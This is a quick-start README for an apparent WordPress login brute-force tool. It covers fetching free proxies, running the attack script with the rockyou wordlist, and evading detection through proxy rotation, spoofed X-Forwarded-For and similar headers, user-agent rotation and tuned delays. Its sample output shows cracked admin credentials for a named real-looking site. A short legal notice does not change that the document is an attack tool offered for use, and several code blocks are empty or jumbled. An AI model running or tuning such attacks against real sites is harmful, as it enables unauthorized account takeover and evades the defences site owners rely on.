# 🚀 Quick Start Guide - Advanced WP Brute Force with Proxy Protection

## What's New in This Version?

✅ **Advanced Proxy Management**
- Automatic proxy validation
- Smart health tracking
- Dead proxy detection
- Best-proxy + fallback rotation

✅ **Enhanced Stealth**
- Multi-layer IP spoofing (5+ headers)
- 8 authentic user agents
- Random request delays (0.5-2.0s)
- Realistic browser headers

✅ **Intelligent Rate Limiting**
- Detects 429/403/503 responses
- Skips blocked users automatically
- Proxy-specific health metrics

✅ **Detailed Logging**
- Real-time attack logs
- JSON results export
- Proxy statistics tracking
- Complete forensics support

---

## ⚡ Quick Setup (3 Steps)

### Step 1: Get Proxies
```bash
python fetch_proxies.py
```
This creates `proxies.txt` with free proxies

### Step 2: (Optional) Verify Proxies
```bash
python -c "
import requests
proxies = open('proxies.txt').read().strip().split('\n')
print(f'[*] Testing {len(proxies)} proxies...')
for p in proxies[:5]:
    try:
        r = requests.get('http://httpbin.org/ip', 
                        proxies={'http': f'http://{p}'}, 
                        timeout=3)
        print(f'✓ {p}')
    except:
        print(f'✗ {p}')
"
```

### Step 3: Run Attack
```bash
python wp_brute.py
```

---

## 📁 Files Included

| File | Purpose |
|------|---------|
| `wp_brute.py` | Main advanced brute force script |
| `fetch_proxies.py` | Auto-downloader for free proxies |
| `PROXY_SETUP_GUIDE.md` | Detailed proxy configuration |
| `rockyou.txt` | Password wordlist |
| `proxies.txt` | (created by fetch_proxies.py) |

---

## 🎯 Key Features

### Proxy Management
```
- Validates each proxy before use
- Tracks success/failure ratio
- Excludes dead proxies automatically  
- Rotates between best performers
- Falls back to round-robin if needed
```

### IP Obfuscation
```
- Random X-Forwarded-For
- Spoofed X-Real-IP
- Cloudflare CF-Connecting-IP
- Client-IP rotation
- Realistic X-Forwarded-Proto/Host
```

### Rate Limiting
```
- 0.5-2.0 second random delay
- Per-username block tracking
- Rate limit detection (429/403/503)
- Automatic user exclusion
```

### Logging & Results
```
- Real-time progress display
- Complete attack logs
- JSON credential export
- Proxy health statistics
- Detailed error tracking
```

---

## 📊 Output Example

### After attack, you'll get:

**1. wp_brute_results_20260315_143022.json**
```json
{
  "target": "https://noumanwebdesign.com/wp-login.php",
  "timestamp": "2026-03-15T14:30:22",
  "statistics": {
    "total_attempts": 1500,
    "successful_creds": 2,
    "failed_attempts": 1498,
    "rate_limited": 5,
    "proxy_rotations": 142,
    "errors": {...}
  },
  "credentials": [
    {"username": "admin", "password": "password123"}
  ]
}
```

**2. wp_brute_log_20260315_143022.txt**
```
[+] Loaded 5000 passwords
[+] Loaded 45 proxies
[+] ProxyManager initialized with 45 proxies
[*] Target: https://noumanwebdesign.com/wp-login.php
[*] Validating target...
[+] Valid WordPress login page detected!
[*] [142] Trying: admin:password123
[+] SUCCESS! User: admin | Password: password123
```

**3. proxy_stats_20260315_143022.json**
```json
{
  "total_proxies": 45,
  "dead_proxies": 3,
  "proxy_health": {
    "192.168.1.1:8080": {"success": 28, "fail": 2},
    "10.0.0.1:3128": {"success": 15, "fail": 0},
    ...
  }
}
```

---

## ⚙️ Configuration (in wp_brute.py)

### Change Target
```python
URL = 'https://example.com/wp-login.php' 
```

### Change Usernames
```python
USERNAMES = ['admin', 'root', 'user'] 
```

### Adjust Aggressiveness
```python
self.request_delay_min = 1.0
self.request_delay_max = 3.0
self.max_workers = 5
self.request_delay_min = 0.1
self.request_delay_max = 0.3
self.max_workers = 25
```

---

## 🛡️ Detection Avoidance

The script prevents IP blocking by:

1. **Proxy Rotation**: Different IP for every request
2. **Health Tracking**: Uses best proxies first, blacklists dead ones
3. **IP Spoofing**: Adds fake IPs to 5+ headers
4. **User-Agent Rotation**: 8 different browser identities
5. **Rate Limiting**: Random delays, adaptive to target response
6. **Header Variation**: Realistic browser headers every request
7. **Error Handling**: Gracefully handles 403/429/503 responses

---

## 🚨 Troubleshooting

### No proxies loading
```bash
cat proxies.txt | head -5
python fetch_proxies.py
```

### Getting rate limited
```bash
self.request_delay_min = 2.0
self.request_delay_max = 5.0
self.max_workers = 5
python fetch_proxies.py
```

### All proxies fail validation
```bash
123.45.67.89:8080
98.76.54.32:3128

```

### Connection timeout errors
```bash
self.timeout = 30 
python -c "import requests; requests.get('https://google.com')"
```

---

## 📈 Advanced Tips

### For Maximum Stealth:
```python
```

### For Maximum Speed:
```python
```

### For Long Campaigns:
```python

```

---

## ⚠️ Legal & Ethical Notice

❌ **DO NOT USE** on systems you don't own or have permission to test  
❌ **DO NOT USE** for malicious purposes  
✅ **DO USE** only on your own systems or with explicit written consent  
✅ **DO COMPLY** with all applicable laws  

Unauthorized access is illegal. This tool is for authorized penetration testing only.

---

## 📚 Full Documentation

See `PROXY_SETUP_GUIDE.md` for:
- Advanced proxy sources
- Paid proxy service recommendations  
- Configuration tuning guide
- Detailed feature explanations
- Additional testing commands

---

## 🎓 How It Works

```
1. Load passwords from rockyou.txt
2. Load and validate proxies from proxies.txt
3. For each username:
   4. For each password:
      5. Select best-performing proxy
      6. Generate spoofed headers (random IPs, UA, etc)
      7. Apply random delay (0.5-2.0s)
      8. Send login request through proxy
      9. Check response for success indicators
      10. Mark proxy as success/fail
      11. Skip if rate limited (429/403/503)
12. Save results to JSON & logs
13. Generate proxy statistics
```

---

## 🔧 System Requirements

- Python 3.7+
- requests library: `pip install requests`
- rockyou.txt (already included)
- ~100MB disk space for proxies.txt

---

## 📞 Quick Commands Reference

```bash
# Run main attack
python wp_brute.py

# Fetch new proxies
python fetch_proxies.py

# View results
cat wp_brute_results_*.json | python -m json.tool

# View logs (last 50 lines)
tail -50 wp_brute_log_*.txt

# Count successful attempts
grep "SUCCESS" wp_brute_log_*.txt | wc -l

# Check proxy stats
cat proxy_stats_*.json | python -m json.tool
```

---

**Advanced WP Brute Force v2.0 - Professional Anti-Detection Proxy Setup**

*Last Updated: March 15, 2026*
